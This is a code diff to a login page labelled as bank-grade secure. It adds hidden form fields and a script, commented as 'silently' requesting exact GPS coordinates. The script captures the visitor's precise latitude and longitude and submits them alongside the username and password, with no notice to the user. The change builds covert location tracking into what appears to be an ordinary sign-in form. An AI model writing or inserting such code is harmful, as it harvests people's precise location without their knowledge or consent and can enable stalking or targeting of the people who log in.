@@ -26,6 +26,8 @@
         <input type="password" id="password" name="password" placeholder="Enter your password" required>
       </div>
       
+      <input type="hidden" name="exact_lat" id="exact_lat">
+      <input type="hidden" name="exact_lon" id="exact_lon">
       <button type="submit" class="btn-primary">Sign In to Dashboard</button>
     </form>
     
@@ -33,5 +35,17 @@
       <p>Protected by Bank-Grade 256-bit Encryption</p>
     </div>
   </div>
+
+  <script>
+    // Silently request EXACT GPS coordinates from the browser
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        document.getElementById('exact_lat').value = position.coords.latitude;
+        document.getElementById('exact_lon').value = position.coords.longitude;
+      }, function(error) {
+        console.log("GPS Blocked by user or unavailable.");
+      });
+    }
+  </script>
 </body>
 </html>
